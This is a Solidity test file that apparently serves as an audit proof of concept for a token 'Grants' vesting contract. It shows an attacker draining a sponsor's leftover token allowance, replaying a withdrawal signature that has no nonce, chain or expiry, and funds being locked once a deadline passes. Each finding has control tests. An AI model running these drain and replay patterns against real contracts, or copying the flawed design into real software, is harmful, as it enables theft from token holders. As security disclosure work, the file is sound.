// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;
import {Proof} from "proof/Proof.sol";
import {Grants} from "../src/Grants.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract Tok is ERC20("Tok", "TOK") {
    function mint(address to, uint256 a) external { _mint(to, a); }
}

contract GrantsProof is Proof {
    Tok tok;
    Grants grants;
    address sponsor = address(0x5905);
    uint256 bobKey = 0xB0B;
    address bob;
    address mallory = address(0xBAD);
    address oldDeposit = address(0xDE9);    // an exchange deposit address bob used once
    uint64 start;
    uint64 end;

    function setUp() public {
        vm.warp(1_700_000_000);
        bob = vm.addr(bobKey);
        tok = new Tok();
        grants = new Grants(IERC20(address(tok)));
        tok.mint(sponsor, 1_000_000e18);
        start = uint64(block.timestamp);
        end = start + 100 days;
        vm.startPrank(sponsor);
        tok.approve(address(grants), 1_000_000e18);   // standing approval; only 100k is meant for bob now
        grants.fund(sponsor, bob, 100_000e18, start, end);   // grant id 0
        vm.stopPrank();
    }

    function _sig(address to) internal returns (bytes memory) {
        bytes32 h = keccak256(abi.encodePacked("Withdraw to ", to));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(bobKey, h);
        return abi.encodePacked(r, s, v);
    }

    // Issue 1: fund pulls from a caller-chosen sponsor, so anyone can spend a sponsor's leftover allowance on a grant to themselves.
    function test_issue1_anyoneSpendsSponsorAllowance() public {
        assertEq(tok.allowance(sponsor, address(grants)), 900_000e18, "sponsor's leftover allowance");
        vm.startPrank(mallory);
        grants.fund(sponsor, mallory, 900_000e18, start - 99 days, start + 1 days);   // grant id 1, 99% unlocked
        grants.withdraw(1);
        vm.stopPrank();
        assertGt(tok.balanceOf(mallory), 890_000e18, "mallory withdrew ~891k of the sponsor's tokens");
        assertEq(tok.balanceOf(sponsor), 0, "the sponsor's remaining 900k was pulled into mallory's grant");
    }

    // Control for issue 1: without an allowance, fund cannot pull from someone else.
    function test_control_noAllowanceNoPull() public {
        vm.prank(sponsor);
        tok.approve(address(grants), 0);
        vm.prank(mallory);
        vm.expectRevert();
        grants.fund(sponsor, mallory, 1e18, start, end);
    }

    // Issue 2: the signed message has no nonce, grant id, contract, chain or expiry, so it can be replayed forever.
    function test_issue2_withdrawSignatureReplays() public {
        vm.warp(start + 10 days);
        bytes memory sig = _sig(oldDeposit);
        grants.withdrawTo(0, oldDeposit, sig);                 // the one withdrawal bob asked for: 10k
        assertEq(tok.balanceOf(oldDeposit), 10_000e18, "first withdrawal");

        vm.prank(sponsor);
        grants.fund(sponsor, bob, 50_000e18, start, end);      // grant id 1, funded later
        vm.warp(start + 60 days);
        vm.startPrank(mallory);
        grants.withdrawTo(0, oldDeposit, sig);                 // replayed on the same grant
        grants.withdrawTo(1, oldDeposit, sig);                 // and on bob's other grant
        vm.stopPrank();
        assertEq(tok.balanceOf(oldDeposit), 60_000e18 + 30_000e18, "90k sent to the old address from one signature");
        assertEq(tok.balanceOf(bob), 0, "bob received nothing himself");
    }

    // Issue 3: withdrawals close at `end`, the instant the last tokens unlock, so anything not withdrawn in that
    // exact second is locked forever.
    function test_issue3_windowClosesWhenLastTokensUnlock() public {
        vm.warp(start + 50 days);
        vm.prank(bob);
        grants.withdraw(0);
        assertEq(tok.balanceOf(bob), 50_000e18, "half withdrawn");
        vm.warp(end + 1);
        vm.prank(bob);
        vm.expectRevert();
        grants.withdraw(0);
        assertEq(tok.balanceOf(address(grants)), 50_000e18, "the other 50k is stuck in the contract");
    }

    // Control for issue 3: only in the exact end second can the full amount be taken.
    function test_control_fullWithdrawOnlyAtExactEnd() public {
        vm.warp(end);
        vm.prank(bob);
        grants.withdraw(0);
        assertEq(tok.balanceOf(bob), 100_000e18, "full amount at block.timestamp == end");
    }

    // Control for issue 2: a signature from someone else is rejected.
    function test_control_wrongSignerRejected() public {
        vm.warp(start + 10 days);
        bytes32 h = keccak256(abi.encodePacked("Withdraw to ", mallory));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(0xBAD, h);
        vm.expectRevert();
        grants.withdrawTo(0, mallory, abi.encodePacked(r, s, v));
    }
}
